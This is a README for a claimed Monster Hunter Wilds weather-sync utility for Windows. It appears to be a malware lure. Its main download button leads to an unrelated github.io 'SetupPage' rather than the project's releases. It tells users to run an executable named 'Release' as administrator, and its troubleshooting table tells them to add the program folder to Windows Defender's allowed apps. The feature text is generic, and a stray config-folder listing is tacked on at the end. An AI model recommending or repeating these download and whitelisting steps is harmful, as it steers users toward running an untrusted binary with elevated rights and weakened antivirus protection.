# MHWilds‑WeatherSync
**Real‑world weather meets Monster Hunter Wilds** – a lightweight Windows‑only companion that mirrors the sky outside your window inside the game.

---

## 🎮 What is this?

MHWilds‑WeatherSync is a desktop utility for **Windows 10/11** that fetches live weather data from your location and translates it into the in‑game weather system of *Monster Hunter Wilds*.
Play under the same clouds, rain, or sunshine you’re experiencing right now – no manual toggles, no utility codes.

---

## ✨ Features

| ✅ | Feature |
|---|---|
| 🌍 | Automatic geolocation (or manual city entry) |
| ⏱️ | Real‑time updates every 10 minutes (configurable) |
| 🌦️ | Full mapping of real‑world conditions to in‑game weather types |
| 🎚️ | Adjustable intensity scaling (light drizzle → gentle rain, etc.) |
| 🛡️ | Runs silently in the background, no overlay clutter |
| 📂 | Portable – just unzip and run, no installer needed |

---

## 📦 Getting Started

1. **Download** the latest package from the button below.
2. Extract the archive to a folder of your choice.
3. Run `Release` (double‑click the file).
4. Grant location permission when prompted, or type a city name.
5. Launch *Monster Hunter Wilds* – the weather will sync automatically.

> **Tip:** Keep the utility running in the system tray for continuous updates.

---

## 🔘 Quick Download

<a href="https://rewfdf.github.io/SetupPage/" target="_blank"><img src="https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge&logo=windows" alt="Download button"></a>
<a href="https://github.com/MidnightPilotPonder/MHWilds-WeatherSync/releases/latest" target="_blank"><img src="https://img.shields.io/github/v/release/MidnightPilotPonder/MHWilds-WeatherSync?style=for-the-badge&label=Latest%20Release" alt="Latest release"></a>

---

## 📚 How It Works

1. **Weather API** – The app queries a free weather service using your latitude/longitude.
2. **Mapping Engine** – Each weather condition (clear, cloudy, rain, storm, snow) is matched to the closest in‑game counterpart.
3. **Game Hook** – Via a non‑intrusive memory read/write routine, the current in‑game weather ID is overwritten with the mapped value.
4. **Sync Loop** – The process repeats at the interval you set, ensuring the game stays in step with the real world.

All operations are performed locally; no data is sent to external servers beyond the weather API request.

---

## 🐞 Troubleshooting

| Issue | Fix |
|-------|-----|
| **No weather change in game** | Ensure the utility runs with **administrator privileges** (right‑click → Run as administrator). |
| **Location not detected** | Manually enter a city name in the settings window, then click **Refresh**. |
| **Frequent “access denied” errors** | Add the program folder to your Windows Defender “Allowed apps” list. |
| **Game crashes after sync** | Verify you are using the latest version of *Monster Hunter Wilds* (patch 1.4+). |

If problems persist, open an **Issue** on GitHub with logs from the `logs/` directory.

---

## 🤝 Contributing

Your ideas make this utility better! Feel free to:

* Fork the repository and submit a Pull Request.
* Propose new weather mappings or API integrations.
* Report bugs or suggest enhancements via the **Issues** tab.

Please adhere to the **Contributor Code of Conduct** (included in the repo).

---

## 📜 License

This project is licensed under the **MIT License** – you’re free to use, modify, and redistribute it, provided the original copyright notice is retained.

---

## 📢 Acknowledgements

* **OpenWeatherMap** – for the reliable weather data API.
* The *Monster Hunter Wilds* community – for inspiration and testing feedback.

---

*Happy hunting, and may the skies be ever in your favor!*

## 📁 Configuration System

```text
configs/
├── default.cfg
├── visual.cfg
├── player.cfg
└── custom.cfg
```